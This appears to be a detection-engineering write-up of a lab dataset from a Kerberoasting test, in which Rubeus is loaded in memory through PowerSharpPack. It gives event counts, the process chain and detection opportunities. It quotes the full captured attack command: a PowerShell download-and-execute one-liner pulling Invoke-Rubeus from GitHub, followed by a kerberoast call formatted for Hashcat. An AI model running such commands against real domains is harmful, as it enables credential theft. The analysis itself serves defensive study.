# T1558.003-7: Kerberoasting — WinPwn PowerSharpPack Rubeus

## Technique Context

Kerberoasting (T1558.003) lets any domain user request Kerberos TGS tickets for SPN-bearing service accounts and crack them offline. This test represents the most evasion-oriented variant in this group: it uses WinPwn's PowerSharpPack to load a PowerShell-wrapped, Reflection-invoked version of Rubeus. PowerSharpPack provides C# offensive tools (Rubeus, Seatbelt, SharpHound, etc.) compiled as Base64-encoded assemblies embedded in PowerShell scripts. The technique avoids writing a Rubeus binary to disk — instead, the Rubeus assembly is loaded directly into the PowerShell process via `[System.Reflection.Assembly]::Load()` and executed through the PowerShell wrapper.

## What This Dataset Contains

The dataset spans approximately 4 seconds on 2026-03-17 from ACME-WS06 (acme.local domain) and contains 141 events across Application, PowerShell, Security, and Sysmon channels.

**The attack command**, captured in Security EID 4688 and Sysmon EID 1:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"}
```

Sysmon EID 1 tags this process `technique_id=T1059.001,technique_name=PowerShell`.

**Process chain** (Security EID 4688): `whoami.exe` pre-check, the attacking `powershell.exe` with the PowerSharpPack download-and-invoke command, a second `whoami.exe`, and a cleanup `powershell.exe & {}`. The Rubeus command specifies `/format:hashcat /nowrap` — output formatted for Hashcat input and without line wrapping, indicating the intent to pass directly to a cracking tool.

**Sysmon events include:**
- EID 7 (Image Load): 25 events — .NET CLR assemblies loading into PowerShell. Critically, when Rubeus is loaded via `[System.Reflection.Assembly]::Load()`, the Rubeus assembly itself appears as an image load event in Sysmon EID 7 with no corresponding file on disk
- EID 10 (Process Access): 4 events — PowerShell opening child processes with full access rights, tagged `T1055.001/Dynamic-link Library Injection`
- EID 11 (File Create): PowerShell writing `StartupProfileData-NonInteractive` to the SYSTEM profile
- EID 17 (Pipe Create): Two `\PSHost.*` named pipes

**PowerShell channel** (99 events): 98 EID 4104 script block records and 1 EID 4103. The 4103 shows `Set-ExecutionPolicy Bypass`. The `Invoke-Rubeus` wrapper function and the embedded Base64 Rubeus assembly would be distributed across the 98 EID 4104 blocks. The cleanup hook is visible: `Invoke-AtomicTest T1558.003 -TestNumbers 7 -Cleanup -Confirm:$false`.

**Application channel**: One EID 15 Security Center report.

## What This Dataset Does Not Contain

No Kerberos ticket events (EID 4769) are present. Rubeus ran in memory with the `kerberoast /format:hashcat /nowrap` command but found no SPN-bearing accounts in the acme.local domain available for harvesting. The attack executed completely — the Rubeus assembly loaded and ran — but produced no ticket output.

No Rubeus binary exists on disk, and no corresponding file path appears in Sysmon file creation events. The assembly loads entirely from the PowerShell process memory space after being decoded from the Base64 blob embedded in `Invoke-Rubeus.ps1`.

There are no network events in the Sysmon breakdown (no EID 3 or 22 in the sample set for this test). The WinPwn/PowerSharpPack download would have generated a DNS query and network connection, but these may have fallen outside the sampled events. The full dataset's sysmon.jsonl (37 events) would contain these if present; the eid_breakdown shows only EIDs 7, 10, 1, 17, and 11.

## Assessment

This dataset represents the most operationally mature Kerberoasting approach in the T1558.003 test group. The combination of Reflection-based assembly loading and `/format:hashcat /nowrap` output formatting demonstrates intent beyond simple credential access — it reflects preparation for a complete offline cracking workflow.

The absence of a Rubeus binary on disk is a significant forensic distinction from T1558.003-2 (where `rubeus.exe` is staged at `C:\AtomicRedTeam\ExternalPayloads\`). Here, the only artifact is the PowerShell process and its in-memory loaded assemblies. The Sysmon EID 7 image load records for the Rubeus .NET assembly are the primary host-based indicator.

Compared with the defended variant (datasets/art/T1558.003-7, Sysmon: 46, Security: 10, PowerShell: 35), this undefended dataset has 141 total events versus 91 in the defended run. The defended run's higher Sysmon count (46 vs 37) is somewhat surprising and may reflect additional Defender scan events in that run. The PowerShell count is notably higher here (99 vs 35) because AMSI in the defended run blocked the script before the Rubeus PowerShell wrapper could log its full content.

## Detection Opportunities Present in This Data

**Command-line content** in Security EID 4688 and Sysmon EID 1: `Invoke-Rubeus` combined with `kerberoast /format:hashcat /nowrap` is unambiguous. The PowerSharpPack URL (`S3cur3Th1sSh1t/PowerSharpBinaries/Invoke-Rubeus.ps1`) is a well-documented offensive resource.

**Sysmon EID 7 image loads without a corresponding file path** indicate Reflection-loaded assemblies. When `[System.Reflection.Assembly]::Load()` is used, Sysmon logs the loaded module with an empty or synthesized path. A .NET assembly containing Kerberos attack functionality loading into PowerShell without a file path is a strong indicator of fileless tool execution.

**PowerShell EID 4104 script block content**: The Base64-encoded Rubeus assembly and the `Invoke-Rubeus` wrapper function are logged across multiple script blocks in the full dataset. Even if the assembly itself is obfuscated, the function name `Invoke-Rubeus` and the `-Command "kerberoast"` parameter appear in plaintext.

**`/format:hashcat /nowrap` parameters**: These flags appear verbatim in the Security EID 4688 command line and indicate the operator intends to pass the output directly to Hashcat for offline cracking. This level of operational detail in the command line is a high-confidence attack indicator.
